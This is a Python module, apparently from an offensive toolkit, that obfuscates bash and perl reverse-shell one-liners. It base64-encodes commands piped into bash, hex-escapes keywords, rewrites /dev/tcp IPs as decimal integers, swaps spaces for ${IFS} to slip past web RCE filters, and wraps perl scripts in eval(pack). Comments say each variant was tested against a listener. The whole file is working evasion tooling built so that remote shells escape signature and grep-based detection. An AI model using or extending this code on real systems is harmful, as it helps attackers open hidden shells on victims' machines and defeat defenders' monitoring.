#!/usr/bin/env python3

'''

    shobfuscator.py
    Obfuscation for the bash and perl payloads.

    psobfuscator.py renames identifiers, which is what makes sense for a
    powershell script. These payloads are one liners with no functions and no
    local variables to rename, so the techniques are different: re-encode the
    command so the recognisable strings never appear literally.

    Every variant here was checked by running it against a listener. Each one
    returns (name, payload) so the caller can print them all and pick.

'''

import base64
import re
import string


def ipToDecimal(ip):
    # 127.0.0.1 -> 2130706433. bash accepts this form in /dev/tcp.
    parts = ip.split('.')
    if len(parts) != 4:
        return None
    value = 0
    for octet in parts:
        if not octet.isdigit() or not 0 <= int(octet) <= 255:
            return None
        value = value * 256 + int(octet)
    return value


def toAnsiCHex(text):
    # $'\x62\x61\x73\x68' is read by bash as "bash".
    return "$'" + ''.join('\\x%02x' % b for b in text.encode()) + "'"


def toPerlHex(text):
    return '"' + ''.join('\\x%02x' % b for b in text.encode()) + '"'


def toPackHex(text):
    return 'pack("H*","' + text.encode().hex() + '")'


def toBase64(text):
    return base64.b64encode(text.encode()).decode()


def obfuscateBash(payload, ip=None, port=None):
    '''Returns [(technique, payload)] for a bash one liner.'''
    out = []

    # Works for any payload: the whole command travels base64 encoded and
    # never appears as text.
    out.append(("base64",
                f"echo {toBase64(payload)}|base64 -d|bash"))

    # Also generic: bash expands the ANSI-C escapes before running -c, so no
    # keyword is present in the command line.
    out.append(("hex ANSI-C",
                "bash -c " + toAnsiCHex(payload)))

    # /dev/tcp takes the host as a plain integer, which hides the IP from a
    # grep for dotted quads.
    if ip and '/dev/tcp/' in payload:
        decimal = ipToDecimal(ip)
        if decimal is not None:
            out.append(("IP en decimal",
                        payload.replace('/dev/tcp/' + ip + '/',
                                        '/dev/tcp/%d/' % decimal)))

    # ${IFS} instead of spaces defeats naive space filters, which is the point
    # of it in a web RCE. Skipped when the payload quotes or redirects: ${IFS}
    # does not expand inside single quotes, and next to a redirection it
    # expands to space+tab+newline and the target file name comes out wrong.
    # Both cases were verified to produce a payload that no longer connects.
    if "'" not in payload and not re.search(r'[<>&|]', payload):
        out.append(("${IFS} por espacios",
                    payload.replace(' ', '${IFS}')))

    return out


def obfuscatePerl(payload, ip=None, port=None):
    '''Returns [(technique, payload)] for a perl one liner.'''
    out = []

    # Pull the script out of perl -e '...' so it can be re-encoded whole.
    m = re.match(r"^perl\s+-e\s+'(.*)'\s*$", payload, re.DOTALL)
    body = m.group(1) if m else None

    if body:
        # The entire script becomes a hex blob handed to eval.
        out.append(("eval(pack) del script entero",
                    "perl -e 'eval(%s)'" % toPackHex(body)))

    out.append(("base64",
                f"echo {toBase64(payload)}|base64 -d|sh"))

    if body:
        # Replace the double quoted literals with their \x form, so "/bin/sh"
        # and the IP stop being greppable while the script stays readable as
        # perl.
        def hexLiteral(match):
            return toPerlHex(match.group(1))

        hexed = re.sub(r'"([^"\\]*)"', hexLiteral, body)
        # Rename the single letter variables at the same time.
        hexed = renamePerlVars(hexed)
        if hexed != body:
            out.append(("cadenas en hex", "perl -e '%s'" % hexed))

    return out


def renamePerlVars(body):
    # $i and $p carry the address and port in the stock payload. Renaming them
    # costs nothing and removes the hint.
    names = sorted(set(re.findall(r'\$([a-z])\b', body)))
    used = set(names)
    mapping = {}
    for n in names:
        for candidate in string.ascii_lowercase:
            if candidate not in used:
                mapping[n] = candidate
                used.add(candidate)
                break
    for old, new in mapping.items():
        body = re.sub(r'\$' + old + r'\b', '$' + new, body)
    return body
